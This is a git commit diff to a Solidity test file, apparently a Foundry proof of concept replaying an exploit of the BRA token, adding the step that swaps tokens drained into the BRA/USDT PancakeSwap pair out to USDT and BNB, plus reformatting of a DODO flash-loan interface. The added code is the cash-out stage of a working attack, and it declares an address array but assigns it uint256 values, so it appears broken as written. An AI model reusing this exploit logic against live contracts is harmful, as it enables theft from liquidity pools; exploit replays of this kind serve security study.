9d5151df281a8cfd641072a6ed162be2c2d12927
vinhtrinhvan <trinhvanvinh018>
2024-03-25 08:31:14 +0700

    swap

--- test/BRA.exp.sol
+++ test/BRA.exp.sol
@@ -80,6 +80,29 @@ contract Exploit {
         //}
         uint256 pairBalancerAfter = bra.balanceOf(BRA_USDT_Pair);
         console.log(" ~ pairBalancerAfter:", pairBalancerAfter);
+        // swap bra to usdt
+        address[] memory inputSwapPath = new address[](2);
+        address[] memory outputSwapAmounts = new uint256[](2);
+        inputSwapPath[0] = address(bra);
+        inputSwapPath[1] = address(usdt);
+        outputSwapAmounts = pancakeRouter.getAmountsOut(
+            pairBalancerAfter - pairBalanceBefore,
+            inputSwapPath
+        );
+        uint256 usdtAmount = outputSwapAmounts[1];
+        IPancakePair(BRA_USDT_Pair).swap(0, usdtAmount, address(this), "");
+        // usdt to wbnb
+        inputSwapPath[0] = address(usdt);
+        inputSwapPath[1] = address(wbnb);
+        pancakeRouter.swapExactTokensForETH(
+            usdtAmount,
+            1,
+            inputSwapPath,
+            address(this),
+            block.timestamp
+        );
+        // BNB to WBNB
+        console2.log("amount: ", wbnb.balanceOf(address(this)));
     }
 }
 
@@ -121,32 +144,54 @@ interface IDPPAdvanced {
     }
 
     function _BASE_PRICE_CUMULATIVE_LAST_() external view returns (uint256);
+
     function _BASE_RESERVE_() external view returns (uint112);
+
     function _BASE_TARGET_() external view returns (uint112);
+
     function _BASE_TOKEN_() external view returns (address);
+
     function _BLOCK_TIMESTAMP_LAST_() external view returns (uint32);
+
     function _IS_OPEN_TWAP_() external view returns (bool);
+
     function _I_() external view returns (uint128);
+
     function _K_() external view returns (uint64);
+
     function _LP_FEE_RATE_() external view returns (uint64);
+
     function _MAINTAINER_() external view returns (address);
+
     function _MT_FEE_RATE_MODEL_() external view returns (address);
+
     function _NEW_OWNER_() external view returns (address);
+
     function _OWNER_() external view returns (address);
+
     function _QUOTE_RESERVE_() external view returns (uint112);
+
     function _QUOTE_TARGET_() external view returns (uint112);
+
     function _QUOTE_TOKEN_() external view returns (address);
+
     function _RState_() external view returns (uint32);
+
     function claimOwnership() external;
+
     function flashLoan(
         uint256 baseAmount,
         uint256 quoteAmount,
         address assetTo,
         bytes memory data
     ) external;
+
     function getBaseInput() external view returns (uint256 input);
+
     function getMidPrice() external view returns (uint256 midPrice);
+
     function getPMMState() external view returns (PMMState memory state);
+
     function getPMMStateForCall()
         external
         view
@@ -159,14 +204,18 @@ interface IDPPAdvanced {
             uint256 Q0,
             uint256 R
         );
+
     function getQuoteInput() external view returns (uint256 input);
+
     function getUserFeeRate(
         address user
     ) external view returns (uint256 lpFeeRate, uint256 mtFeeRate);
+
     function getVaultReserve()
         external
         view
         returns (uint256 baseReserve, uint256 quoteReserve);
+
     function init(
         address owner,
         address maintainer,
@@ -178,7 +227,9 @@ interface IDPPAdvanced {
         uint256 i,
         bool isOpenTWAP
     ) external;
+
     function initOwner(address newOwner) external;
+
     function querySellBase(
         address trader,
         uint256 payBaseAmount
@@ -191,6 +242,7 @@ interface IDPPAdvanced {
             uint8 newRState,
             uint256 newBaseTarget
         );
+
     function querySellQuote(
         address trader,
         uint256 payQuoteAmount
@@ -203,7 +255,9 @@ interface IDPPAdvanced {
             uint8 newRState,
             uint256 newQuoteTarget
         );
+
     function ratioSync() external;
+
     function reset(
         address assetTo,
         uint256 newLpFeeRate,
@@ -214,10 +268,15 @@ interface IDPPAdvanced {
         uint256 minBaseReserve,
         uint256 minQuoteReserve
     ) external returns (bool);
+
     function retrieve(address to, address token, uint256 amount) external;
+
     function sellBase(address to) external returns (uint256 receiveQuoteAmount);
+
     function sellQuote(address to) external returns (uint256 receiveBaseAmount);
+
     function transferOwnership(address newOwner) external;
+
     function tuneParameters(
         uint256 newLpFeeRate,
         uint256 newI,
@@ -225,10 +284,12 @@ interface IDPPAdvanced {
         uint256 minBaseReserve,
         uint256 minQuoteReserve
     ) external returns (bool);
+
     function tunePrice(
         uint256 newI,
         uint256 minBaseReserve,
         uint256 minQuoteReserve
     ) external returns (bool);
+
     function version() external pure returns (string memory);
 }
